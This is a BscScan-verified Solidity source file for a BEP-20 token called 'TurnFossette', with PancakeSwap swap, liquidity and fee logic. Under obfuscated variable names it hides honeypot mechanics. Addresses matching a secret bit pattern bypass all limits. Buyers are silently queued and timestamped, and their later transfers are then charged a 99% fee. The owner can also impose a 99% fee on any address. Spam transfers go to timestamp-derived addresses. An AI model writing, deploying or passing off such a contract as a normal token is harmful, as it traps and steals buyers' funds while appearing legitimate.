/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract TurnFossette is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Turn Fossette ";
    string constant _symbol = "TurnFossette";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private receiverTeamLimitSwapLaunchedModeMin;
    mapping(address => bool) private limitTeamSellAuto;
    mapping(address => bool) private botsLaunchedTxMode;
    mapping(address => bool) private swapAutoTradingLaunchedLiquidityMarketingFee;
    mapping(address => uint256) private burnBuyModeMarketing;
    mapping(uint256 => address) private burnModeTxLiquidityIsWallet;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private receiverMaxModeBots = 0;
    uint256 private exemptBotsSwapMarketing = 7;

    //SELL FEES
    uint256 private isTeamSellMax = 0;
    uint256 private teamTxFeeSwapMarketingMax = 7;

    uint256 private feeReceiverMarketingSwapLiquidity = exemptBotsSwapMarketing + receiverMaxModeBots;
    uint256 private feeMinWalletMarketing = 100;

    address private maxLaunchedBuyBurnLimitReceiverMode = (msg.sender); // auto-liq address
    address private maxLiquidityWalletTx = (0xb125a5662f1AE64FBF55Ca65Ffffcaf482f3e564); // marketing address
    address private marketingLaunchedModeTrading = DEAD;
    address private liquidityTeamMinBuyMarketing = DEAD;
    address private limitFeeTradingTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private maxAutoMinBots;
    uint256 private txSwapBuyReceiverIs;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private receiverBotsAutoWallet;
    uint256 private burnSellTradingMaxLiquidityFee;
    uint256 private limitMarketingLaunchedFee;
    uint256 private walletSellMaxMinLiquidityTradingReceiver;
    uint256 private swapWalletTradingAutoLaunchedBuyLimit;

    bool private maxMarketingLaunchedExempt = true;
    bool private swapAutoTradingLaunchedLiquidityMarketingFeeMode = true;
    bool private burnFeeBotsLaunchedLimit = true;
    bool private isBotsFeeAutoBurnExempt = true;
    bool private autoBurnTxLimitBuySwapLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitExemptBurnBuy = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        receiverBotsAutoWallet = true;

        receiverTeamLimitSwapLaunchedModeMin[msg.sender] = true;
        receiverTeamLimitSwapLaunchedModeMin[address(this)] = true;

        limitTeamSellAuto[msg.sender] = true;
        limitTeamSellAuto[0x0000000000000000000000000000000000000000] = true;
        limitTeamSellAuto[0x000000000000000000000000000000000000dEaD] = true;
        limitTeamSellAuto[address(this)] = true;

        botsLaunchedTxMode[msg.sender] = true;
        botsLaunchedTxMode[0x0000000000000000000000000000000000000000] = true;
        botsLaunchedTxMode[0x000000000000000000000000000000000000dEaD] = true;
        botsLaunchedTxMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txTeamSwapFeeSellBurnLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return txTeamSwapFeeSellBurnLimit(sender, recipient, amount);
    }

    function txTeamSwapFeeSellBurnLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isMarketingMaxAuto(sender) || isMarketingMaxAuto(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                feeReceiverAutoTxIsLiquidity();
            }
            if (!bLimitTxWalletValue) {
                feeMinExemptBurn(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return launchedSwapMarketingBurn(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(maxMarketingLaunchedExempt, "Trading is not active");
        }

        if (!Administration[sender] && !receiverTeamLimitSwapLaunchedModeMin[sender] && !receiverTeamLimitSwapLaunchedModeMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || botsLaunchedTxMode[sender] || botsLaunchedTxMode[recipient], "Max TX Limit has been triggered");

        if (launchedTradingLimitSwap()) {exemptLiquidityTxSellModeMin();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = maxTradingSellLaunched(sender) ? tradingModeReceiverLimitBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedSwapMarketingBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function maxTradingSellLaunched(address sender) internal view returns (bool) {
        return !limitTeamSellAuto[sender];
    }

    function botsLimitTradingSellIsWalletBurn(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            feeReceiverMarketingSwapLiquidity = teamTxFeeSwapMarketingMax + isTeamSellMax;
            return minFeeIsLiquidity(sender, feeReceiverMarketingSwapLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeReceiverMarketingSwapLiquidity = exemptBotsSwapMarketing + receiverMaxModeBots;
            return feeReceiverMarketingSwapLiquidity;
        }
        return minFeeIsLiquidity(sender, feeReceiverMarketingSwapLiquidity);
    }

    function tradingModeReceiverLimitBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(botsLimitTradingSellIsWalletBurn(sender, receiver == uniswapV2Pair)).div(feeMinWalletMarketing);

        if (swapAutoTradingLaunchedLiquidityMarketingFee[sender] || swapAutoTradingLaunchedLiquidityMarketingFee[receiver]) {
            feeAmount = amount.mul(99).div(feeMinWalletMarketing);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 4; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function isMarketingMaxAuto(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function minFeeIsLiquidity(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = burnBuyModeMarketing[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function feeMinExemptBurn(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        burnModeTxLiquidityIsWallet[exemptLimitValue] = addr;
    }

    function feeReceiverAutoTxIsLiquidity() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (burnBuyModeMarketing[burnModeTxLiquidityIsWallet[i]] == 0) {
                    burnBuyModeMarketing[burnModeTxLiquidityIsWallet[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(maxLiquidityWalletTx).transfer(amountBNB * amountPercentage / 100);
    }

    function launchedTradingLimitSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    autoBurnTxLimitBuySwapLiquidity &&
    _balances[address(this)] >= limitExemptBurnBuy;
    }

    function exemptLiquidityTxSellModeMin() internal swapping {
        uint256 amountToLiquify = limitExemptBurnBuy.mul(receiverMaxModeBots).div(feeReceiverMarketingSwapLiquidity).div(2);
        uint256 amountToSwap = limitExemptBurnBuy.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeReceiverMarketingSwapLiquidity.sub(receiverMaxModeBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(receiverMaxModeBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(exemptBotsSwapMarketing).div(totalETHFee);

        payable(maxLiquidityWalletTx).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxLaunchedBuyBurnLimitReceiverMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapAutoTradingLaunchedLiquidityMarketingFee(address a0) public view returns (bool) {
        if (swapAutoTradingLaunchedLiquidityMarketingFee[a0] != swapAutoTradingLaunchedLiquidityMarketingFee[a0]) {
            return isBotsFeeAutoBurnExempt;
        }
        if (a0 != marketingLaunchedModeTrading) {
            return autoBurnTxLimitBuySwapLiquidity;
        }
        if (a0 == liquidityTeamMinBuyMarketing) {
            return autoBurnTxLimitBuySwapLiquidity;
        }
            return swapAutoTradingLaunchedLiquidityMarketingFee[a0];
    }
    function setSwapAutoTradingLaunchedLiquidityMarketingFee(address a0,bool a1) public onlyOwner {
        swapAutoTradingLaunchedLiquidityMarketingFee[a0]=a1;
    }

    function getTeamTxFeeSwapMarketingMax() public view returns (uint256) {
        if (teamTxFeeSwapMarketingMax == isTeamSellMax) {
            return isTeamSellMax;
        }
        if (teamTxFeeSwapMarketingMax != exemptBotsSwapMarketing) {
            return exemptBotsSwapMarketing;
        }
        return teamTxFeeSwapMarketingMax;
    }
    function setTeamTxFeeSwapMarketingMax(uint256 a0) public onlyOwner {
        if (teamTxFeeSwapMarketingMax == feeMinWalletMarketing) {
            feeMinWalletMarketing=a0;
        }
        if (teamTxFeeSwapMarketingMax == limitExemptBurnBuy) {
            limitExemptBurnBuy=a0;
        }
        if (teamTxFeeSwapMarketingMax != exemptBotsSwapMarketing) {
            exemptBotsSwapMarketing=a0;
        }
        teamTxFeeSwapMarketingMax=a0;
    }

    function getIsBotsFeeAutoBurnExempt() public view returns (bool) {
        if (isBotsFeeAutoBurnExempt == autoBurnTxLimitBuySwapLiquidity) {
            return autoBurnTxLimitBuySwapLiquidity;
        }
        if (isBotsFeeAutoBurnExempt != autoBurnTxLimitBuySwapLiquidity) {
            return autoBurnTxLimitBuySwapLiquidity;
        }
        return isBotsFeeAutoBurnExempt;
    }
    function setIsBotsFeeAutoBurnExempt(bool a0) public onlyOwner {
        if (isBotsFeeAutoBurnExempt != autoBurnTxLimitBuySwapLiquidity) {
            autoBurnTxLimitBuySwapLiquidity=a0;
        }
        if (isBotsFeeAutoBurnExempt != burnFeeBotsLaunchedLimit) {
            burnFeeBotsLaunchedLimit=a0;
        }
        isBotsFeeAutoBurnExempt=a0;
    }

    function getLimitTeamSellAuto(address a0) public view returns (bool) {
            return limitTeamSellAuto[a0];
    }
    function setLimitTeamSellAuto(address a0,bool a1) public onlyOwner {
        limitTeamSellAuto[a0]=a1;
    }

    function getSwapAutoTradingLaunchedLiquidityMarketingFeeMode() public view returns (bool) {
        return swapAutoTradingLaunchedLiquidityMarketingFeeMode;
    }
    function setSwapAutoTradingLaunchedLiquidityMarketingFeeMode(bool a0) public onlyOwner {
        swapAutoTradingLaunchedLiquidityMarketingFeeMode=a0;
    }

    function getMaxLiquidityWalletTx() public view returns (address) {
        if (maxLiquidityWalletTx == maxLaunchedBuyBurnLimitReceiverMode) {
            return maxLaunchedBuyBurnLimitReceiverMode;
        }
        return maxLiquidityWalletTx;
    }
    function setMaxLiquidityWalletTx(address a0) public onlyOwner {
        if (maxLiquidityWalletTx == marketingLaunchedModeTrading) {
            marketingLaunchedModeTrading=a0;
        }
        maxLiquidityWalletTx=a0;
    }

    function getBurnModeTxLiquidityIsWallet(uint256 a0) public view returns (address) {
            return burnModeTxLiquidityIsWallet[a0];
    }
    function setBurnModeTxLiquidityIsWallet(uint256 a0,address a1) public onlyOwner {
        if (burnModeTxLiquidityIsWallet[a0] == burnModeTxLiquidityIsWallet[a0]) {
           burnModeTxLiquidityIsWallet[a0]=a1;
        }
        if (a0 != exemptBotsSwapMarketing) {
            marketingLaunchedModeTrading=a1;
        }
        burnModeTxLiquidityIsWallet[a0]=a1;
    }

    function getBotsLaunchedTxMode(address a0) public view returns (bool) {
        if (a0 != liquidityTeamMinBuyMarketing) {
            return isBotsFeeAutoBurnExempt;
        }
            return botsLaunchedTxMode[a0];
    }
    function setBotsLaunchedTxMode(address a0,bool a1) public onlyOwner {
        if (a0 != liquidityTeamMinBuyMarketing) {
            burnFeeBotsLaunchedLimit=a1;
        }
        if (botsLaunchedTxMode[a0] == swapAutoTradingLaunchedLiquidityMarketingFee[a0]) {
           swapAutoTradingLaunchedLiquidityMarketingFee[a0]=a1;
        }
        if (a0 != liquidityTeamMinBuyMarketing) {
            isBotsFeeAutoBurnExempt=a1;
        }
        botsLaunchedTxMode[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}